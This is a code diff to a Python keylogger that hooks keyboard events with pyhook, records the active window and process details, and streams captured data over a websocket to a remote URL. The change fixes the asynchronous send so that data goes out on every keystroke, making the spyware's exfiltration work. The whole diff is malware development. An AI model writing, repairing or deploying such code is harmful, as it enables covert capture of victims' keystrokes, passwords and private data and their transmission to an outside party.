@@ -57,16 +57,13 @@ def get_current_process():
     return keylogger_data
 
 
-async def KeyStroke(event):
+def KeyStroke(event):
     global current_window
 
     # check to see if target changed windows
     if event.WindowName != current_window:
         current_window = event.WindowName
         data = get_current_process()
-
-        async with websockets.connect(url) as websocket:
-            await websocket.send(data)
 
     # if they pressed a standard key
     if 32 < event.Ascii < 127:
@@ -82,13 +79,20 @@ async def KeyStroke(event):
         else:
             print("[%s]" % event.Key, end=' ')
 
+    asyncio.get_event_loop().run_until_complete(client(data))
+
     # pass execution to next hook registered 
     return True
 
 
+async def client(data):
+    async with websockets.connect(url) as websocket:
+        await websocket.send(data)
+
+
 # create and register a hook manager
 kl = pyhook.HookManager()
-kl.KeyDown = asyncio.get_event_loop().run_until_complete(KeyStroke)
+kl.KeyDown = KeyStroke
 
 # register the hook and execute forever
 kl.HookKeyboard()
